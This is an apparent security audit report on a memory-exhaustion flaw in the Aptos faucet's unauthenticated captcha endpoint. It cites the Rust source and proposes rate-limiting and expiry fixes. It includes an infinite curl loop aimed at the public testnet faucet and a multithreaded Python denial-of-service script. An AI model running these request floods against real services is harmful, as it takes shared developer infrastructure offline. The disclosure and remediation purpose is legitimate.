# Audit Report

## Title
Unauthenticated Resource Exhaustion in Faucet Captcha Endpoint Leading to Service Denial

## Summary
The `request_captcha()` endpoint in the Aptos faucet service lacks authentication and rate limiting, allowing an unauthenticated attacker to exhaust server memory by creating unlimited captcha challenges. Each challenge is stored in an unbounded in-memory HashMap with no expiration mechanism, leading to Out-of-Memory (OOM) crashes.

## Finding Description

The `/request_captcha` endpoint accepts unauthenticated GET requests without any rate limiting. The endpoint function performs only a simple enabled check before creating a new captcha challenge: [1](#0-0) 

Each call to `create_challenge()` generates a new captcha and stores it in an unbounded HashMap: [2](#0-1) 

The captcha storage uses an in-memory HashMap with no size limits or expiration: [3](#0-2) 

Unsolved captchas remain in memory indefinitely. The only cleanup mechanism removes entries only when correct solutions are submitted: [4](#0-3) 

The developers acknowledged this vulnerability in a warning comment: [5](#0-4) 

The faucet server configuration shows no rate limiting middleware is applied to the captcha endpoint: [6](#0-5) 

**Attack Path:**
1. Attacker sends rapid GET requests to `/request_captcha`
2. Each request creates a captcha image and allocates ~100 bytes for the HashMap entry (u32 key + String value of 5 characters)
3. Requests continue until server memory is exhausted
4. Server crashes with OOM error, causing service unavailability
5. Attack can be repeated after service restart

This violates the **Resource Limits** invariant: "All operations must respect gas, storage, and computational limits."

## Impact Explanation

This vulnerability qualifies as **High Severity** per the Aptos bug bounty program criteria for "API crashes." 

An attacker can completely disable the faucet service by exhausting available memory. While this doesn't affect the blockchain consensus or validator nodes, it impacts the availability of a critical infrastructure service used for:
- Testnet account funding
- Developer onboarding
- Testing and development workflows

A sustained attack with approximately 10-100 million requests (depending on server memory) would cause OOM crashes. With modern botnets or cloud infrastructure, an attacker could easily generate this volume of traffic within minutes.

The faucet service is separate from blockchain consensus, so this does not impact mainnet operations or validator security. However, it significantly degrades the developer experience and testnet accessibility.

## Likelihood Explanation

**Likelihood: Very High**

The attack requires:
- No authentication or credentials
- No special network position
- Simple HTTP GET requests to a public endpoint
- Minimal resources (standard HTTP client)

The attack is trivial to execute using common tools:
```bash
while true; do curl http://faucet.testnet.aptos.com/request_captcha; done
```

Multiple concurrent connections would accelerate the resource exhaustion. The developers' warning comment confirms awareness of this issue, yet it remains unpatched in the codebase.

## Recommendation

Implement multiple layers of defense:

**1. Add Rate Limiting:**
Apply rate limiting specifically to the captcha endpoint, limiting requests per IP address:

```rust
// In captcha.rs
#[oai(
    path = "/request_captcha",
    method = "get",
    operation_id = "request_captcha",
    response_header(name = "CAPTCHA_KEY", ty = "u32", description = "Captcha key"),
    tag = "ApiTags::Captcha"
)]
async fn request_captcha(
    &self,
    remote_addr: RemoteAddr,  // Add IP tracking
) -> Result<Response<Binary<Vec<u8>>>, AptosTapErrorResponse> {
    // Rate limit check here
    if !self.rate_limiter.check_and_increment(remote_addr.0) {
        return Err(AptosTapError::new(
            "Rate limit exceeded for captcha requests".to_string(),
            AptosTapErrorCode::RateLimitExceeded,
        ).into());
    }
    // ... existing code
}
```

**2. Add Challenge Expiration:**
Implement time-based cleanup of old captchas:

```rust
pub struct CaptchaManager {
    challenges: HashMap<u32, (String, SystemTime)>,  // Add timestamp
}

impl CaptchaManager {
    pub fn create_challenge(&mut self) -> Result<(u32, Vec<u8>)> {
        // Clean up expired challenges (older than 5 minutes)
        self.cleanup_expired_challenges(Duration::from_secs(300));
        
        let key = rand::thread_rng().gen_range(0, u32::MAX - 1);
        let (name, image) = /* ... */;
        self.challenges.insert(key, (name, SystemTime::now()));
        Ok((key, image))
    }
    
    fn cleanup_expired_challenges(&mut self, max_age: Duration) {
        let now = SystemTime::now();
        self.challenges.retain(|_, (_, timestamp)| {
            now.duration_since(*timestamp).unwrap_or(Duration::MAX) < max_age
        });
    }
}
```

**3. Add Size Limit:**
Enforce a maximum number of stored challenges:

```rust
const MAX_CHALLENGES: usize = 10_000;

pub fn create_challenge(&mut self) -> Result<(u32, Vec<u8>)> {
    if self.challenges.len() >= MAX_CHALLENGES {
        // Remove oldest challenge or return error
        return Err(anyhow!("Challenge storage at capacity"));
    }
    // ... existing code
}
```

## Proof of Concept

```python
#!/usr/bin/env python3
"""
PoC: Faucet Captcha Resource Exhaustion Attack
Demonstrates memory exhaustion through repeated captcha requests
"""

import requests
import threading
import time
from concurrent.futures import ThreadPoolExecutor

FAUCET_URL = "http://localhost:8081/request_captcha"  # Adjust to target
THREADS = 50
REQUESTS_PER_THREAD = 10000

def make_requests(thread_id):
    """Make repeated requests to the captcha endpoint"""
    success_count = 0
    error_count = 0
    
    for i in range(REQUESTS_PER_THREAD):
        try:
            response = requests.get(FAUCET_URL, timeout=5)
            if response.status_code == 200:
                success_count += 1
                if i % 1000 == 0:
                    print(f"Thread {thread_id}: {i} requests sent")
            else:
                error_count += 1
        except Exception as e:
            error_count += 1
            if "Connection" in str(e):
                print(f"Thread {thread_id}: Server appears down - {e}")
                return
    
    print(f"Thread {thread_id} completed: {success_count} success, {error_count} errors")

def main():
    print(f"Starting attack with {THREADS} threads, {REQUESTS_PER_THREAD} requests each")
    print(f"Total requests: {THREADS * REQUESTS_PER_THREAD:,}")
    print(f"Target: {FAUCET_URL}")
    
    start_time = time.time()
    
    with ThreadPoolExecutor(max_workers=THREADS) as executor:
        futures = [executor.submit(make_requests, i) for i in range(THREADS)]
        for future in futures:
            future.result()
    
    elapsed = time.time() - start_time
    print(f"\nAttack completed in {elapsed:.2f} seconds")
    print(f"Rate: {(THREADS * REQUESTS_PER_THREAD) / elapsed:.0f} requests/second")

if __name__ == "__main__":
    main()
```

**Expected Result:** The faucet server will crash with an OOM error after the HashMap grows beyond available memory. Monitor server memory usage during the attack to observe progressive memory exhaustion.

## Notes

While this vulnerability only affects the faucet service infrastructure (not blockchain consensus), it represents a significant availability issue for testnet users and developers. The presence of an explicit warning comment in the source code indicates the development team is aware of this limitation but has not yet implemented mitigations. Given the trivial exploitation requirements and severe impact on service availability, this should be addressed as a high-priority security fix.

### Citations

**File:** crates/aptos-faucet/core/src/endpoints/captcha.rs (L40-58)
```rust
    async fn request_captcha(&self) -> Result<Response<Binary<Vec<u8>>>, AptosTapErrorResponse> {
        if !self.enabled {
            return Err(AptosTapError::new(
                "The CaptchaChecker is not enabled".to_string(),
                AptosTapErrorCode::EndpointNotEnabled,
            )
            .into());
        }
        let mut captcha_manager = self.captcha_manager.lock().await;
        let (key, image) = match captcha_manager.create_challenge() {
            Ok((key, image)) => (key, image),
            Err(e) => {
                return Err(
                    AptosTapError::new_with_error_code(e, AptosTapErrorCode::CheckerError).into(),
                );
            },
        };
        Ok(Response::new(Binary(image)).header(CAPTCHA_KEY, key))
    }
```

**File:** crates/aptos-faucet/core/src/checkers/tap_captcha.rs (L4-6)
```rust
//! Warning: This could be attacked and cause the server to OOM because we
//! don't throw out captchas info if it has been sitting there for too long /
//! the map grows too large.
```

**File:** crates/aptos-faucet/core/src/checkers/tap_captcha.rs (L125-131)
```rust
#[derive(Debug, Default)]
pub struct CaptchaManager {
    /// When a challenge is created, we return to the client the captcha itself
    /// and a random key they must make the second request with. This is a map
    /// from that random key to the value of the captcha.
    challenges: HashMap<u32, String>,
}
```

**File:** crates/aptos-faucet/core/src/checkers/tap_captcha.rs (L142-162)
```rust
    pub fn create_challenge(&mut self) -> Result<(u32, Vec<u8>)> {
        // Generate a random key.
        let key = rand::thread_rng().gen_range(0, u32::MAX - 1);

        // Generate a captcha.
        let (name, image) = Captcha::new()
            .add_chars(5)
            .apply_filter(Noise::new(0.4))
            .apply_filter(Wave::new(4.0, 6.0).vertical())
            .apply_filter(Wave::new(3.0, 2.0).horizontal())
            .apply_filter(Grid::new(10, 6))
            .apply_filter(Dots::new(8))
            .as_tuple()
            .context("Failed to generate captcha")?;

        // Store the captcha information.
        self.challenges.insert(key, name);

        // Return (key, <captcha as base64>).
        Ok((key, image))
    }
```

**File:** crates/aptos-faucet/core/src/checkers/tap_captcha.rs (L164-177)
```rust
    /// Check a captcha challenge. Returns true if the captcha is correct.
    pub fn check_challenge(&mut self, key: u32, value: &str) -> Result<bool> {
        match self.challenges.get(&key) {
            Some(captcha) => {
                if captcha == value {
                    self.challenges.remove(&key);
                    Ok(true)
                } else {
                    Ok(false)
                }
            },
            None => bail!("Captcha key unknown: {}", key),
        }
    }
```

**File:** crates/aptos-faucet/core/src/server/run.rs (L111-112)
```rust
        // Create a CaptchaManager.
        let captcha_manager = Arc::new(Mutex::new(CaptchaManager::new()));
```
